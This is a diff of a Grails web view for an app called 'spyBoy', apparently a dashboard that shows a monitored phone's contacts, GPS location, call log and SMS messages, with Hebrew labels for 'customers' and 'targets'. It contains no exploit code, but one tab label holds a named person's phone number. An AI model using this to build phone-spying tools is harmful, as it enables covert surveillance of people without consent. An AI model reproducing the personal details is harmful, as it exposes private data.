@@ -3,7 +3,7 @@
 	<head>
 		<meta name="layout" content="base_layout"/>
 	</head>
-	<body>
+<body>
 
 
 <!-- Content Wrapper / Start -->
@@ -17,16 +17,16 @@
 	<div class="container">
 	
 		<div class="eight columns">
-			<h2>Shortcodes</h2>
+			<h2>לקוחות</h2>
 		</div>
 		
 		<div class="eight columns">
 			<nav id="breadcrumbs">
 				<ul>
-					<li>You are here:</li>
-					<li><a href="#">Home</a></li>
-					<li><a href="#">Shortcodes</a></li>
-					<li>Elements</li>
+					<li>אתה נמצא כאן :</li>
+					<li><a href="#">בית</a></li>
+					<li><a href="#">ספייבוי</a></li>
+					<li>מטרות</li>
 				</ul>
 			</nav>
 		</div>
@@ -45,10 +45,8 @@
 
 <!-- Tabs
 ================================================= -->
-	<div class="sixteen columns">
+	<div class="sixteen columns" style="padding-top:10px;">
 	
-		<h3 class="headline">Tabs</h3><span class="line" style="margin-bottom:35px;"></span><div class="clearfix"></div>
-
 			<!-- Tabs Navigation -->
 			<ul class="tabs-nav">
 				<li class="active"><a href="#tab1">איתן ברון : 054-3033425</a></li>
@@ -58,27 +56,27 @@
  
 			<!-- Tabs Content --> 
 			<div class="tabs-container" style="min-height:700px;">
-				<div class="tab-content" id="tab1">
-					<g:include controller="spyBoy" action="contacts" id="contacts"/>
+				<div class="tab-content" id="tab1">					
+					<g:include view="spyBoy/contacts.gsp"/>					
 					<!-- Tabs ================================================= -->
 					<div class="columns">						
 						<!-- Tabs Navigation -->
 						<ul class="tabs-nav">
-							<li class="active"><a href="#smsTab">הודעות(SMS)</a></li>
+							<li class="active"><a href="#locationTab">מיקום(GPS)</a></li>
 							<li><a href="#callLogTab">יומן שיחות</a></li>
-							<li><a href="#locationTab">מיקום(GPS)</a></li>
+							<li><a href="#smsTab">הודעות(SMS)</a></li>
 						</ul>
 			
 						<!-- Tabs Content -->	
 						<div class="tabs-container" style="min-height:500px;">
-							<div class="tab-content" id="smsTab">
-								<g:include controller="spyBoy" action="sms" id="smsAction"/>				
+							<div class="tab-content" id="locationTab">
+								<g:include controller="spyBoy" action="location" id="locationAction" />												
 							</div>
 							<div class="tab-content" id="callLogTab">
 								<g:include controller="spyBoy" action="callLog" id="callLogAction"/>
 							</div>
-							<div class="tab-content" id="locationTab" style="height:500px;">
-								<g:include controller="spyBoy" action="location" id="locationAction"/>
+							<div class="tab-content" id="smsTab">
+								<g:include view="spyBoy/sms.gsp"/>									
 							</div>
 						</div>
 				    </div>				
@@ -87,8 +85,7 @@
 				</div>
 				<div class="tab-content" id="tab3">
 				</div>
-			</div>
-
+			</div>						
 	</div>
 
 </div>
@@ -96,5 +93,26 @@
 
 </div>
 <!-- Content Wrapper / End -->
+
+	<script type="text/javascript">					
+	  <g:remoteFunction update="contactsAjaxTargetDiv" controller="spyBoy" action="contacts" before="spinner()"/>
+
+	  function spinner(){
+		  (function($) {
+				$('#spinner').ajaxStart(function() {
+					$(this).show();
+				}).ajaxStop(function() {
+					$(this).hide();
+				});
+			})(jQuery);
+	  }
+
+	  function runEmoji(){
+		  jQuery('.emoji').emoji();
+	  }
+	  
+	  $(document).ready(function(){runEmoji();});
+	  
+	</script>
 	</body>
 </html>
